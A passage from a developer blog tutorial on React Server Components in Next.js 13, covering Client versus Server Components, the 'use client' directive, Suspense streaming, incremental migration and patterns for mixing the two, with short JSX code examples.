default, none of your page’s code is getting sent to the client.</p><div><figure><figcaption><p>A basic Server Component</p></figcaption><pre><code><span></span><span>function</span> <span>Description</span><span>(</span><span>)</span> <span>{</span> 
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>
<span></span>      None of this code is getting sent to the client. Just the HTML!
<span></span>    </span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span>
<span></span>  <span>)</span>
<span></span><span>}</span></code></pre></figure></div><p>Add async to that Server Component and you can just… fetch data! Here’s what that might look like:</p><div><figure><figcaption><p>A Server Component with data fetching</p></figcaption><pre><code><span></span><span>async</span> <span>function</span> <span>getVideo</span><span>(</span><span>id</span><span>)</span> <span>{</span>
<span></span>  <span>const</span> res <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span><span>`</span><span>https://api.example.com/videos/</span><span><span>${</span>id<span>}</span></span><span>`</span></span><span>)</span>
<span></span>  <span>return</span> res<span>.</span><span>json</span><span>(</span><span>)</span>
<span></span><span>}</span>
<span></span>
<span></span><span>async</span> <span>function</span> <span>Description</span><span>(</span><span><span>{</span> videoId <span>}</span></span><span>)</span> <span>{</span>
<span></span>  <span>const</span> video <span>=</span> <span>await</span> <span>getVideo</span><span>(</span>userId<span>)</span>
<span></span>  <span>return</span> <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>{</span>video<span>.</span>description<span>}</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span>
<span></span><span>}</span></code></pre></figure></div><p>There’s one last ingredient to really unlock the power of RSCs. If you don’t want to be stuck waiting for one slow data fetch, you can wrap your Server Components in <span>React.Suspense</span>. React will show the client a loading fallback, and when the server is done with its data fetching, it will stream the result to the client. The client can then replace the loading fallback with the full component.</p><p>In the example below, the client will see “loading comments” and “loading related videos.” When the server is done fetching the comments, it will render the <span>&lt;Comments /&gt;</span> component and stream the rendered component to the client; likewise with related videos.</p><div><figure><figcaption><p>A Server Component with data fetching and streaming</p></figcaption><pre><code><span></span><span>import</span> <span>{</span> Suspense <span>}</span>  <span>from</span> <span>'react'</span>
<span></span>
<span></span><span>async</span> <span>function</span> <span>VideoSidebar</span><span>(</span><span><span>{</span> videoId <span>}</span></span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span><span>Suspense</span></span> <span>fallback</span><span><span>=</span><span>{</span><span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>loading comments...</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span></span><span>&gt;</span></span><span>
<span></span>      </span><span><span><span>&lt;</span><span>Comments</span></span> <span>videoId</span><span><span>=</span><span>{</span>videoId<span>}</span></span> <span>/&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;/</span><span>Suspense</span></span><span>&gt;</span></span>
<span></span>    <span><span><span>&lt;</span><span>Suspense</span></span> <span>fallback</span><span><span>=</span><span>{</span><span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>loading related videos...</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span></span><span>&gt;</span></span><span>
<span></span>      </span><span><span><span>&lt;</span><span>RelatedVideos</span></span> <span>videoId</span><span><span>=</span><span>{</span>videoId<span>}</span></span> <span>/&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;/</span><span>Suspense</span></span><span>&gt;</span></span>
<span></span>  <span>)</span>
<span></span><span>}</span></code></pre></figure></div><p>Embracing <span>React.Suspense</span> has advantages beyond streaming data when it’s ready. React can also take advantage of Suspense boundaries to prioritize hydrating certain parts of an app in response to user interaction. This is called selective hydration, and is probably a topic better left to <a href="https://www.youtube.com/watch?v=Q98l5o1y3ao">the experts</a>.</p><h3 id="client-components"><a href="#client-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>Client Components</strong></a></h3><p>Now let’s say you have some code that needs to run on the client. For example, maybe you have an <span>onClick</span> listener, or you’re reacting to data stored in <span>useState</span>.</p><p>A component gets shipped in one of two ways. The first: By adding <span>“use client”</span> at the top of a file, that module will be shipped to the client so it can respond to user interaction.</p><div><figure><figcaption><p>A basic Client Component</p></figcaption><pre><code><span></span><span>"use client"</span>
<span></span><span>import</span> <span>{</span> useState <span>}</span> <span>from</span> <span>'react'</span>
<span></span>
<span></span><span>function</span> <span>Counter</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span>const</span> <span>[</span>count<span>,</span> setCount<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span>
<span></span>  <span>const</span> <span>increment</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>setCount</span><span>(</span>count <span>+</span> <span>1</span><span>)</span>
<span></span>
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span>increment<span>}</span></span><span>&gt;</span></span><span>
<span></span>      The count is </span><span>{</span>count<span>}</span><span>
<span></span>    </span><span><span><span>&lt;/</span>button</span><span>&gt;</span></span>
<span></span>  <span>)</span>
<span></span><span>}</span></code></pre></figure></div><p>The second way a component gets shipped to the client is if it’s <em>imported</em> by a Client Component. In other words, if you mark a component with <span>“use client”</span>, not only will that component be shipped to the client, but <em>all the components it imports will also be shipped to the client</em>.</p><p>(Does this mean that a Server Component can’t be a child of a Client Component? No, but it’s a little complicated. More on that later.)</p><p>If it’s helpful, you can think of it this way: <span>“use client”</span> is telling your bundler that <em>this</em> is the client/server boundary. If that’s not helpful, well, ignore the last sentence.</p><h3 id="what-if-a-library-doesnt-support-client-components"><a href="#what-if-a-library-doesnt-support-client-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>What if a library doesn’t support Client Components?</strong></a></h3><p>We can leverage this second way to solve a common problem. Let’s say you want to use a library that doesn’t yet support React Server Components, so it doesn’t have <span>“use client”</span> directives. If you want to make sure that library ships to the client, import it from a Client Component, and it will be shipped to the client too.</p><div><figure><figcaption><p>Converting a library to a Client Component</p></figcaption><pre><code><span></span><span>"use client"</span>
<span></span>
<span></span><span>// because this library is imported in a Client Component,</span>
<span></span><span>// it too becomes a Client Component</span>
<span></span><span>import</span> MuxPlayer <span>from</span> <span>"@mux/mux-player-react"</span>
<span></span>
<span></span><span>function</span> <span>ClientMuxPlayer</span><span>(</span><span>props</span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span><span><span>&lt;</span><span>MuxPlayer</span></span> <span><span>{</span><span>...</span>props<span>}</span></span> <span>/&gt;</span></span>
<span></span><span>}</span></code></pre></figure></div><h3 id="when-should-i-opt-in-to-client-components"><a href="#when-should-i-opt-in-to-client-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>When should I opt in to Client Components?</strong></a></h3><p>Let’s take a step back and summarize.</p><p>Server Components are the brave new React world. They’re great for fetching data and running expensive code that you don’t want or need to send to the client: rendering the text of a blog post, for example, or syntax-highlighting a code block. When convenient, you should leave your code as Server Components to avoid bloating your client bundle.</p><p>Client Components are the React you know and love. They can be server-side rendered, and they’re sent to the client to be hydrated and executed. Client Components are great when you want to react to user input or change state over time.</p><p>If your whole app was made of Client Components, it would work just like it used to with yesterday’s SSR frameworks. So don’t feel pressured to convert your whole app to Server Components all at once! Adopt them incrementally in places that would stand to gain the most. And… speaking of incremental adoption…</p><h2 id="how-do-i-incrementally-adopt-react-server-components-in-a-real-life-codebase"><a href="#how-do-i-incrementally-adopt-react-server-components-in-a-real-life-codebase"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>How do I incrementally adopt React Server Components in a real-life codebase?</strong></a></h2><p>This is the part of the show where folks tend to say, “Neat! But this seems like a lot of work, and I don’t have time to rewrite my whole codebase.” Well, I’m here to tell you that you don’t need to. Here’s the three-step playbook we used to bring most of our code to Server Components:</p><ol><li>Add the <span>“use client”</span> directive to the root of your app</li><li>Move the directive as low in the rendering tree as you can</li><li>Adopt advanced patterns when performance issues arise</li></ol><p>Let’s walk through that.</p><h3 id="1-add-use-client-directive-to-the-root-of-your-app"><a href="#1-add-use-client-directive-to-the-root-of-your-app"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>1. Add <span>“use client”</span> directive to the root of your app</strong></a></h3><p>Yup. That’s it. If you’re in Next.js 13, go to your top-level <span>page.tsx</span> and plop in a <span>“use client”</span> at the top. Your page works just like it used to, except now you’re ready to take on the world of Server Components!</p><div><figure><figcaption><div><p>video</p><!-- --><p>/<wbr>page.jsx</p></div></figcaption><pre><code><span></span><span>"use client"</span>
<span></span>
<span></span><span>export</span> <span>default</span> <span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span><span><span>&lt;</span></span><span>&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;</span><span>Player</span></span> <span>/&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;</span><span>Title</span></span> <span>/&gt;</span></span><span>
<span></span>  </span><span><span><span>&lt;/</span></span><span>&gt;</span></span>
<span></span><span>}</span></code></pre></figure></div><p>Got any server-side data fetching? We can’t do that from a Client Component, so we’re going to add a Server Component. Let’s add it as a parent of the Client Component. That Server Component will perform the data fetching and pass it into our page. Here’s what that will look like:</p><div><figure><figcaption><div><p>video</p><!-- --><p>/<wbr>page.jsx</p></div></figcaption><pre><code><span></span><span>/**
<span></span>  * All we're doing here is fetching data on the server,
<span></span>  * and passing that data to the Client component.
<span></span>  */</span>
<span></span><span>import</span> VideoPageClient <span>from</span> <span>'./page.client.jsx'</span>
<span></span>
<span></span><span>// this used to be getServerSideProps</span>
<span></span><span>async</span> <span>function</span> <span>fetchData</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span>const</span> res <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>'https://api.example.com'</span><span>)</span>
<span></span>  <span>return</span> <span>await</span> res<span>.</span><span>json</span><span>(</span><span>)</span>
<span></span><span>}</span>
<span></span>
<span></span><span>export</span> <span>default</span> <span>async</span> <span>function</span> <span>FetchData</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span>const</span> data <span>=</span> <span>await</span> <span>fetchData</span><span>(</span><span>)</span>
<span></span>  <span>{</span><span>/* We moved our page's contents into this Client Component */</span><span>}</span>
<span></span>  <span>const</span> <span><span><span>&lt;</span><span>VideoPageClient</span></span> <span>data</span><span><span>=</span><span>{</span>data<span>}</span></span> <span>/&gt;</span></span>
<span></span><span>}</span>
<span></span>
<span></span><span>export</span> <span>default</span> Page</code></pre></figure></div><div><figure><figcaption><div><p>video</p><!-- --><p>/<wbr>page.client.jsx</p></div></figcaption><pre><code><span></span><span>/**
<span></span>  * Our whole app, except for the data fetching, can live here.
<span></span>  */</span>
<span></span><span>"use client"</span>
<span></span>
<span></span><span>export</span> <span>default</span> <span>function</span> <span>App</span><span>(</span><span><span>{</span> data <span>}</span></span><span>)</span> <span>{</span>
<span></span>  <span><span><span>&lt;</span></span><span>&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;</span><span>Player</span></span> <span>videoId</span><span><span>=</span><span>{</span>data<span>.</span>videoId<span>}</span></span> <span>/&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;</span><span>Title</span></span> <span>content</span><span><span>=</span><span>{</span>data<span>.</span>title<span>}</span></span> <span>/&gt;</span></span><span>
<span></span>  </span><span><span><span>&lt;/</span></span><span>&gt;</span></span>
<span></span><span>}</span></code></pre></figure></div><h3 id="2-move-the-directive-as-low-in-the-rendering-tree-as-you-can"><a href="#2-move-the-directive-as-low-in-the-rendering-tree-as-you-can"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>2. Move the directive as low in the rendering tree as you can</strong></a></h3><p>Next, take that <span>“use client”</span> directive and move it from that top-level component into each of its children. In our example, we’ll be moving it from our <span>&lt;Client /&gt;</span> component into our <span>&lt;Player /&gt;</span> and <span>&lt;Title /&gt;</span> components.</p><div><figure><figcaption><div><p>video</p><!-- --><p>/<wbr>Player.jsx</p></div></figcaption><pre><code><span></span><span>"use client"</span>
<span></span><span>import</span> MuxPlayer <span>from</span> <span>"@mux/mux-player-react"</span>
<span></span>
<span></span><span>function</span> <span>Player</span><span>(</span><span><span>{</span> videoId <span>}</span></span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span><span><span>&lt;</span><span>MuxPlayer</span></span> <span>streamType</span><span><span>=</span><span>"</span>on-demand<span>"</span></span> <span>playbackId</span><span><span>=</span><span>{</span>videoId<span>}</span></span> <span>/&gt;</span></span>
<span></span><span>}</span></code></pre></figure></div><div><figure><figcaption><div><p>video</p><!-- --><p>/<wbr>Title.jsx</p></div></figcaption><pre><code><span></span><span>"use client"</span>
<span></span>
<span></span><span>function</span> <span>Title</span><span>(</span><span><span>{</span> content <span>}</span></span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span><span><span>&lt;</span>h1</span><span>&gt;</span></span><span>{</span>content<span>}</span><span><span><span>&lt;/</span>h1</span><span>&gt;</span></span>
<span></span><span>}</span></code></pre></figure></div><p>And repeat! Except… because neither <span>&lt;Player /&gt;</span> nor <span>&lt;Title /&gt;</span> have children into which we can push the <span>“use client”</span> directive, let’s remove it!</p><p><span>&lt;Title /&gt;</span> has no issues, because <span>&lt;Title /&gt;</span> doesn’t require any client-side code and can be shipped as pure HTML. Meanwhile, <span>&lt;Player /&gt;</span> throws an error.</p><p>Great. That’s as low as we can go. Let’s restore <span>“use client”</span> to the <span>&lt;Player /&gt;</span> component to address that error and call it a day.</p><p>See? That wasn’t too bad. We’ve moved our app to Server Components. Now, as we add new components and refactor old ones, we can write with Server Components in mind. And, we’ve saved a bit of bundle size by not shipping <span>&lt;Title /&gt;</span> !</p><h3 id="3-adopt-advanced-patterns-when-performance-issues-arise"><a href="#3-adopt-advanced-patterns-when-performance-issues-arise"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>3. Adopt advanced patterns when performance issues arise</strong></a></h3><p>Steps 1 and 2 should be enough for most cases. But if you’re noticing performance issues, there are still some wins you can squeeze out of your RSC conversion.</p><p>For example, when we <a href="https://www.mux.com/blog/the-building-blocks-of-great-docs">migrated our docs site to RSCs</a>, we leaned on two patterns to unlock deeper gains. The first was wrapping key Server Components in <span>Suspense</span> to enable streaming of slow data fetches (as demonstrated earlier). Our whole app is statically generated except for the changelog sidebar, which comes from a <a href="https://en.wikipedia.org/wiki/Content_management_system">CMS</a>. By wrapping that sidebar in Suspense, the rest of the app doesn’t have to wait for the CMS fetch to resolve. Beyond that, we leveraged Next.js 13’s <a href="https://nextjs.org/docs/app/building-your-application/routing/loading-ui-and-streaming"><span>loading.js</span></a> convention, which uses Suspense/streaming under the hood.</p><p>The second optimization we applied was creatively rearranging Client and Server Components to ensure that large libraries, like our syntax highlighting, <a href="https://prismjs.com/">Prism</a>, stayed on the server. And speaking of creatively rearranging Client and Server Components…</p><h2 id="did-someone-say-advanced-patterns"><a href="#did-someone-say-advanced-patterns"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>Did someone say advanced patterns?</strong></a></h2><h3 id="how-do-you-mix-client-and-server-components"><a href="#how-do-you-mix-client-and-server-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>How do you mix Client and Server Components?</strong></a></h3><p>We established earlier that any component imported from a Client Component would itself become a Client Component. So… how do you make a Server Component a child of a Client Component? Long story short,<strong> pass Server Components as children or props instead of importing them.</strong> The Server Component will be rendered on the server, serialized, and sent to your Client Component.</p><p>This, imo, is the hardest thing to wrap your head around in this whole RSC mess. It gets easier with practice. Let’s check out some examples, starting with the wrong way.</p><div><figure><figcaption><p>How NOT to mix Client and Server Components</p></figcaption><pre><code><span></span><span>"use client"</span>
<span></span>
<span></span><span>// Anything imported from a Client Component becomes a Client Component</span>
<span></span><span>// so this is wrong!</span>
<span></span><span>import</span> ServerComponentB <span>from</span> <span>'./ServerComponentB.js'</span>
<span></span>
<span></span><span>function</span> <span>ClientComponent</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>
<span></span>      </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span>onClickFunction<span>}</span></span><span>&gt;</span></span><span>Button</span><span><span><span>&lt;/</span>button</span><span>&gt;</span></span><span>
<span></span>      </span><span>{</span><span>/* because this was imported from a Client Component, it became a Client Component too. */</span><span>}</span><span>
<span></span>      </span><span><span><span>&lt;</span><span>ServerComponentB</span></span> <span>/&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span>
<span></span>  <span>)</span>
<span></span><span>}</span></code></pre></figure></div><p>By importing <span>ServerComponent</span> in a Client Component, we shipped <span>ServerComponent</span> to the client. Oh no! To do this properly, we have to go up a level to the nearest Server Component — in this case, <span>ServerPage</span> — and do our work there.</p><div><figure><figcaption><p>How to mix Client and Server Components</p></figcaption><pre><code><span></span><span>import</span> ClientComponent <span>from</span> <span>'./ClientComponent.js'</span>
<span></span><span>import</span> ServerComponentB <span>from</span> <span>'./ServerComponentB.js'</span>
<span></span>
<span></span><span>/** 
<span></span>  * The first way to mix Client and Server Components
<span></span>  * is to pass a Server Component to a Client Component
<span></span>  * as a child.
<span></span>  */</span>
<span></span><span>function</span> <span>ServerComponentA</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span><span>ClientComponent</span></span><span>&gt;</span></span><span>
<span></span>      </span><span><span><span>&lt;</span><span>ServerComponentB</span></span> <span>/&gt;</span></span><span>
<span></span>    </span><span><span><span>&lt;/</span><span>ClientComponent</span></span><span>&gt;</span></span>
<span></span>  <span>)</span>
<span></span><span>}</span>
<span></span>
<span></span><span>/** 
<span></span>  * The second way to mix Client and Server Components
<span></span>  * is to pass a Server Component to a Client Component
<span></span>  * as a prop.
<span></span>  */</span>
<span></span><span>function</span> <span>ServerPage</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span><span>ClientComponent</span></span>
<span></span>      <span>content</span><span><span>=</span><span>{</span><span><span><span>&lt;</span><span>ServerComponentB</span></span> <span>/&gt;</span></span><span>}</span></span>
<span></span>    <span>/&gt;</span></span>
<span></span>  <span>)</span>
<span></span><span>}</span></code></pre></figure></div><h3 id="can-you-make-half-of-a-file-a-server-component-and-half-of-it-a-client-component"><a href="#can-you-make-half-of-a-file-a-server-component-and-half-of-it-a-client-component"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>Can you make half of a file a Server Component and half of it a Client Component?</strong></a></h3><p>Nope! But here’s a pattern we use a lot, when we want part of our component’s functionality to stay on the server. Let’s say we’re making a <span>&lt;CodeBlock /&gt;</span> component. We might want the syntax highlighting to stay on the server so we don’t have to ship that large library, but we might also want some client functionality so that the user can switch between multiple code examples. First, we break the component into two halves: <span>CodeBlock.server.js</span> and <span>CodeBlock.client.js</span>. The former imports the latter. (The names could be anything; we use <span>.server</span> and <span>.client</span> just to keep things straight.)</p><div><figure><figcaption><div><p>components</p><!-- --><p>/<wbr>CodeBlock</p><!-- --><p>/<wbr>CodeBlock.server.js</p></div></figcaption><pre><code><span></span><span>// filename: components/CodeBlock/CodeBlock.server.js</span>
<span></span><span>import</span> Highlight <span>from</span> <span>'expensive-library'</span>
<span></span><span>import</span> ClientCodeBlock <span>from</span> <span>'./CodeBlock.client.js'</span>
<span></span><span>import</span> <span>{</span> example0<span>,</span> example1<span>,</span> example2 <span>}</span> <span>from</span> <span>'./examples.js'</span>
<span></span>
<span></span><span>function</span> <span>ServerCodeBlock</span><span>(</span><span>)</span> <span>{</span>
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span><span>ClientCodeBlock</span></span>
<span></span>      <span>// because we're passing these as props, they remain server-only</span>
<span></span>      <span>renderedExamples</span><span><span>=</span><span>{</span><span>[</span>
<span></span>        <span><span><span>&lt;</span><span>Highlight</span></span> <span>code</span><span><span>=</span><span>{</span>example0<span>.</span>code<span>}</span></span> <span>language</span><span><span>=</span><span>{</span>example0<span>.</span>language<span>}</span></span> <span>/&gt;</span></span><span>,</span>
<span></span>        <span><span><span>&lt;</span><span>Highlight</span></span> <span>code</span><span><span>=</span><span>{</span>example1<span>.</span>code<span>}</span></span> <span>language</span><span><span>=</span><span>{</span>example1<span>.</span>language<span>}</span></span> <span>/&gt;</span></span><span>,</span>
<span></span>        <span><span><span>&lt;</span><span>Highlight</span></span> <span>code</span><span><span>=</span><span>{</span>example2<span>.</span>code<span>}</span></span> <span>language</span><span><span>=</span><span>{</span>example2<span>.</span>language<span>}</span></span> <span>/&gt;</span></span>
<span></span>      <span>]</span><span>}</span></span>
<span></span>    <span>&gt;</span></span><span>
<span></span>  )
<span></span>}
<span></span>
<span></span>export default ServerCodeBlock</span></code></pre></figure></div><div><figure><figcaption><div><p>components</p><!-- --><p>/<wbr>CodeBlock</p><!-- --><p>/<wbr>CodeBlock.client.js</p></div></figcaption><pre><code><span></span><span>"use client"</span>
<span></span><span>import</span> <span>{</span> useState <span>}</span> <span>from</span> <span>'react'</span>
<span></span>
<span></span><span>function</span> <span>ClientCodeBlock</span><span>(</span><span><span>{</span> renderedExamples <span>}</span></span><span>)</span> <span>{</span>
<span></span>  <span>// because we need to react to state and onClick listeners,</span>
<span></span>  <span>// this must be a Client Component</span>
<span></span>  <span>const</span> <span>[</span>currentExample<span>,</span> setCurrentExample<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>1</span><span>)</span>
<span></span>  
<span></span>  <span>return</span> <span>(</span>
<span></span>    <span><span><span>&lt;</span></span><span>&gt;</span></span><span>
<span></span>      </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>setCurrentExample</span><span>(</span><span>0</span><span>)</span><span>}</span></span><span>&gt;</span></span><span>Example 1</span><span><span><span>&lt;/</span>button</span><span>&gt;</span></span><span>
<span></span>      </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>setCurrentExample</span><span>(</span><span>1</span><span>)</span><span>}</span></span><span>&gt;</span></span><span>Example 2</span><span><span><span>&lt;/</span>button</span><span>&gt;</span></span><span>
<span></span>      </span><span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>setCurrentExample</span><span>(</span><span>2</span><span>)</span><span>}</span></span><span>&gt;</span></span><span>Example 3</span><span><span><span>&lt;/</span>button</span><span>&gt;</span></span><span>
<span></span>      </span><span>{</span> renderedExamples<span>[</span>currentExample<span>]</span> <span>}</span><span>
<span></span>    </span><span><span><span>&lt;/</span></span><span>&gt;</span></span>
<span></span>  <span>)</span>
<span></span><span>}</span>
<span></span>
<span></span><span>export</span> <span>default</span> ClientCodeBlock</code></pre></figure></div><p>Now that we have those two components, let’s make them easy to consume with a <a href="https://www.joshwcomeau.com/react/file-structure/">delightful file structure</a>. Let’s put those two files in a folder called <span>CodeBlock</span> and add an <span>index.js</span> file that looks like this:</p><div><figure><figcaption><div><p>components</p><!-- --><p>/<wbr>CodeBlock</p><!-- --><p>/<wbr>index.js</p></div></figcaption><pre><code><span></span><span>export</span> <span>{</span> <span>default</span> <span>}</span> <span>from</span> <span>'./CodeBlock.server.js'</span></code></pre></figure></div><p>Now, any consumer can <span>import CodeBlock from ‘components/CodeBlock.js’</span> and the Client and Server Components remain transparent.</p><h3 id="this-is-confusing-how-can-i-be-sure-that-my-code-is-running-on-the-server"><a href="#this-is-confusing-how-can-i-be-sure-that-my-code-is-running-on-the-server"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>This is confusing. How can I be sure that my code is running on the server?</strong></a></h3><p>Honestly, at first, we just added <span>console.log</span> to our code during development and checked to see if that log came out of the server or web browser. This was enough to begin with, but we did eventually find a better way.</p><p>If you want to be extra sure that your Server Component will never get included in a bundle, you can import the <a href="https://www.npmjs.com/package/server-only"><span>server-only</span> package</a>. This is extra handy if you want to make sure a large library or a secret key doesn’t end up where it shouldn’t. (Though if you’re using Next.js, <a href="https://nextjs.org/docs/app/building-your-application/configuring/environment-variables#bundling-environment-variables-for-the-browser">it<em> will</em> protect you</a> from accidentally shipping your environment variables.)</p><p>Using <span>server-only</span> also had 